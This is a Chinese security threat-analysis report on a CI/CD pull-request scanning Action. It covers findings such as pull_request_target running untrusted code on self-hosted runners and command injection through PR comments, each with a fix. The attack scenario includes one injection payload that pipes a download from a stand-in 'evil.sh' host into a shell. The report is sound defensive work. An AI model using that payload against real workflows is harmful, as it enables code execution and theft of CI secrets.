# 安全威胁分析报告：malicious-code-scan-action

| 项 | 内容 |
|---|---|
| 仓库路径 | `D:\skill\skill收集\repo\malicious-code-scan-action` |
| 分析日期 | 2026-09-02 |
| 分析方法 | 静态代码审计（STRIDE-A 威胁建模 + 配置/供应链检查） |
| 报告语言 | 中文 |
| 部署分类 | CI/CD 插件（GitCode/GitHub Action，`runs.using: node16`），在流水线 Runner 上执行 |

---

## 一、系统概述

### 1.1 用途与技术栈

该仓库是一个 **PR 恶意代码扫描 Action**：在 PR 场景下通过 HTTPS 调用远程"防投毒"扫描服务（后端为 `openlibing-anti-poison`，接口 `/action-pr/scan`、`/action-pr/query-status`），创建扫描任务、每 10 秒轮询结果（最长 30 分钟），并按扫描结果阻断 PR（exit -1）。

- 语言：Node.js（CommonJS），仅使用内置 `https`/`crypto`，无第三方运行时依赖
- 入口：`actions/malicious-code-pr-scan-action/action.yml:39-40` → `dist/malicious-code-pr-scan.js`
- 签名：`dist/signer.js`（华为云 API 网关 HMAC-SHA256 签名，AK/SK 由 workflow secrets 注入）
- 示例工作流：`.gitcode/workflows/sca-pr-scan.yml`、`.gitcode/workflows/pre-commit.yml`

### 1.2 组件与信任边界

| 组件 ID | 锚点 | 说明 | 信任边界 |
|---|---|---|---|
| ActionConfig | `actions/malicious-code-pr-scan-action/action.yml` | 输入 AK/SK、pr-id、repository-name 等 | 仓库维护者 → Runner |
| ScanAction | `dist/malicious-code-pr-scan.js`（`AntiPoison` 类） | 拼 PR URL、签名请求、轮询 | Runner 进程内 |
| Signer | `dist/signer.js` | HMAC-SHA256 签名 | Runner 进程内 |
| Workflow | `.gitcode/workflows/*.yml` | 触发器、secrets 注入、Runner 选择 | 代码托管平台 → Runner |
| AntiPoisonService | 远程 `apig.openlibing.com`（外部服务） | 扫描后端 | 外部边界（HTTPS） |
| ExternalActor | PR 提交者 / 评论者 | 不可信输入来源 | 外部攻击者 |

**信任边界说明**：Action 运行在 CI Runner 上，可访问 `secrets`（AK/SK、ROBOT_TOKEN）；PR 提交者与评论者是**不可信外部主体**，其输入（PR 内容、评论正文、事件元数据）进入 workflow 与 Runner 执行环境。

---

## 二、STRIDE-A 威胁分析汇总

| STRIDE 类别 | 威胁数 | 代表性威胁 |
|---|---|---|
| S 仿冒（Spoofing） | 1 | 第三方 Action 未固定版本，可被替换为恶意 Action |
| T 篡改（Tampering） | 4 | 评论内容注入 run 脚本；Action 标签可变；node16 EOL 无补丁；Step/日志内容未转义 |
| R 抵赖（Repudiation） | 0 | — |
| I 信息泄露（Information Disclosure） | 3 | 响应体全量打印日志；AK/SK 长期有效且覆盖面广；无 lock 文件构建不可复现 |
| D 拒绝服务（DoS） | 1 | self-hosted runner 被任意 PR 占用执行 |
| E 权限提升（Elevation） | 2 | pull_request_target + 检出 PR 代码在自建 Runner 执行任意命令；评论注入窃取 secrets |
| A 业务滥用（Abuse） | 1 | 可被利用反复触发扫描任务消耗后端资源 |

### 关键威胁场景

**场景 1（E，最严重）**：外部攻击者提交 PR → workflow 以 `pull_request_target` 触发（持有基础分支权限与 `secrets.ROBOT_TOKEN`）→ 在 **self-hosted runner** 上检出 PR 的 `merge_commit_sha` → 执行该仓库 `.pre-commit-config.yaml` 中定义的钩子（`npm install` 触发 postinstall 任意脚本）→ 攻击者在持久化自建 Runner 上执行任意代码并窃取 Token。

**场景 2（T/E）**：攻击者在 PR 评论中写入 `sca-pr-scan"; curl evil.sh|sh; echo "` → workflow 中 `echo "comment.body: ${{ atomgit.event.comment.body }}"` 在脚本生成期展开 → shell 命令注入，Job 携带 `SCAN_ACCESS_KEY/SCAN_SECRET_KEY`。

---

## 三、安全发现明细

### 严重

*本仓库无"严重"级发现（最严重为"高"）。*

### 高危

#### FIND-01：`pull_request_target` + self-hosted runner 检出并执行不可信 PR 代码

| 属性 | 内容 |
|---|---|
| STRIDE | E（权限提升） |
| CWE | [CWE-266](https://cwe.mitre.org/data/definitions/266.html) 不正确的权限分配；[CWE-913](https://cwe.mitre.org/data/definitions/913.html) 代码控制范围不当 |
| OWASP | A01:2025 – Broken Access Control |
| 利用前提 | 能向仓库提交 PR（外部匿名/任意账号） |
| 证据 | `.gitcode/workflows/pre-commit.yml:4`（`pull_request_target`）；`:15`（`runs-on: ["self-hosted", "region=overseas"]`）；`:21`（`ref: ${{ atomgit.event.pull_request.merge_commit_sha \|\| ...head.sha }}`）；`pre-commit-config.yaml:41,50`（钩子执行 `npm install` / `npm run lint:fix`） |
| 风险 | `pull_request_target` 以基础分支权限运行并可访问 secrets，却检出 PR 提交者控制的代码；self-hosted runner 为持久化非一次性环境。外部 PR 即可在 Runner 上执行任意命令、窃取 `ROBOT_TOKEN`、横向污染后续构建。 |
| 修复建议 | ① 不可信 PR 使用 `pull_request` 触发器（无 secrets）；② self-hosted runner 仅用于可信事件，或改用一次性 ephemeral runner；③ pre-commit 钩子固定使用基础分支版本的配置，不执行 PR 代码中的钩子定义。 |
| 修复成本 | 中 |

#### FIND-02：PR 评论正文未转义直接插值进 `run:` 脚本（命令注入）

| 属性 | 内容 |
|---|---|
| STRIDE | T / E |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) OS 命令注入 |
| OWASP | A03:2025 – Injection |
| 利用前提 | 能发表 PR 评论（触发词 `sca-pr-scan`） |
| 证据 | `.gitcode/workflows/sca-pr-scan.yml:7-9`（`pull_request_comment`，`comments: ['sca-pr-scan']`）；`:21` `echo "comment.body: ${{ atomgit.event.comment.body }}"`；同文件 :20、:22-24 还插值 event_name、author_association、repository 等字段 |
| 风险 | workflow 表达式在 shell 脚本生成期展开，平台不做 shell 转义。评论正文可闭合引号注入任意命令，Job 环境持有 AK/SK secrets。 |
| 修复建议 | 严禁在 `run:` 中直接展开 `event.*` 上下文；一律通过 `env:` 传递（如 `COMMENT_BODY: ${{ atomgit.event.comment.body }}`），脚本内引用 `"$COMMENT_BODY"`。 |
| 修复成本 | 低 |

### 中危

#### FIND-03：第三方 Action 引用未固定版本（供应链篡改）

| 属性 | 内容 |
|---|---|
| STRIDE | T |
| CWE | [CWE-1357](https://cwe.mitre.org/data/definitions/1357.html) 供应链组件来源不可信；[CWE-829](https://cwe.mitre.org/data/definitions/829.html) |
| OWASP | A08:2025 – Software and Data Integrity Failures |
| 证据 | `.gitcode/workflows/sca-pr-scan.yml:28` `uses: sca-pr-scan`（无版本/SHA）；`pre-commit.yml:18,24,30,36`（checkout/setup-node/setup-go/openlibing-pre-commit-action 均未固定）；README.md:85/89/124/128 示例同样未 pin |
| 风险 | Action 标签可变，若市场端 Action 被替换/劫持，流水线即执行任意代码并接触 AK/SK、ROBOT_TOKEN。 |
| 修复建议 | 固定到不可变版本（完整仓库 + tag + commit SHA）。 |
| 修复成本 | 低 |

#### FIND-04：Action 运行时 node16 已停止维护（EOL）

| 属性 | 内容 |
|---|---|
| STRIDE | T |
| CWE | [CWE-1104](https://cwe.mitre.org/data/definitions/1104.html) 使用未维护的第三方组件 |
| OWASP | A06:2025 – Vulnerable and Outdated Components |
| 证据 | `action.yml:39` `using: 'node16'` |
| 风险 | Node 16 已于 2023-09 EOL，运行时已知漏洞不再获得安全补丁。 |
| 修复建议 | 升级到 `node20` 并用 node20 重新 ncc 打包验证。 |
| 修复成本 | 低 |

### 低危 / 信息

#### FIND-05：远程服务响应体全量打印到流水线日志

- STRIDE：I ｜ CWE：[CWE-532](https://cwe.mitre.org/data/definitions/532.html) 日志中插入敏感信息 ｜ OWASP：A09:2025
- 证据：`dist/malicious-code-pr-scan.js:77` `console.log('响应内容: ' + response.body)`；另 :58、:65、:121 打印 task_url、params、轮询响应体。
- 风险：响应体/任务参数全量入公开流水线日志，若服务端错误响应回显签名头或敏感字段将造成泄露。
- 建议：仅记录状态码与必要业务字段，禁止打印完整响应体。
- 修复成本：低

#### FIND-06：AK/SK 为长期凭据、以 Action 输入明文传递，无最小权限隔离说明

- STRIDE：I ｜ CWE：[CWE-312](https://cwe.mitre.org/data/definitions/312.html) 明文存储敏感信息 ｜ OWASP：A07:2025
- 证据：`action.yml:6-11`（`scan-access-key`/`scan-secret-key` `required: true`）；`sca-pr-scan.yml:30-31` secrets 注入；README 还列出 4 个密钥（含 action.yml 实际未使用的 result-* 密钥，文档与实现不一致）。
- 风险：平台虽自动掩码 secrets，但凭据长期有效且在所有 PR 流水线可用；一旦 FIND-01/02 被利用即泄露。
- 建议：使用短期凭据/按项目隔离的 AK；删除 README 中未使用密钥说明；服务端按 AK 做项目绑定鉴权与限流。
- 修复成本：中

#### FIND-07：缺少 package-lock.json，构建不可复现

- STRIDE：T ｜ CWE：[CWE-1357](https://cwe.mitre.org/data/definitions/1357.html) ｜ OWASP：A08:2025
- 证据：`package.json`（ncc 0.38.1 / adm-zip 0.5.16 / @actions/core 1.11.1），仓内无 lock 文件。
- 建议：提交 lock 文件，CI 中使用 `npm ci`。
- 修复成本：低

---

## 四、行动摘要（整改优先级）

### Quick Wins（低成本快速修复）

| 编号 | 事项 | 成本 |
|---|---|---|
| FIND-02 | workflow 中所有 `event.*` 改由 `env:` 传递，移除 `run:` 内插值 | 低 |
| FIND-03 | 所有 `uses:` 固定到 tag + commit SHA | 低 |
| FIND-04 | node16 升级 node20 | 低 |
| FIND-05 | 日志不再打印完整响应体 | 低 |
| FIND-07 | 提交 package-lock.json | 低 |

### 需专项处理

| 编号 | 事项 | 成本 |
|---|---|---|
| FIND-01 | 重构 pre-commit 工作流触发器与 Runner 模型（ephemeral runner / 分离可信与不可信事件） | 中 |
| FIND-06 | AK/SK 短期化、按项目隔离、服务端鉴权限流 | 中 |

---

## 五、分析假设与需验证项

1. 本报告基于仓库静态文件；GitCode 平台对 `pull_request_target`、secrets 掩码、Runner 隔离的实际实现需在运行环境验证。
2. `dist/*.js` 为 ncc 打包产物，建议核对其与源码构建一致性（防止 dist 被单独篡改）。
3. 远程扫描服务端的鉴权与限流见《openlibing-anti-poison 安全威胁分析报告》。

## 六、参考标准

- STRIDE-A（Spoofing / Tampering / Repudiation / Information Disclosure / Denial of Service / Elevation of Privilege / Abuse）
- OWASP Top 10:2025、CWE/MITRE、GitHub Security Hardening for GitHub Actions（`pull_request_target` 风险指南）
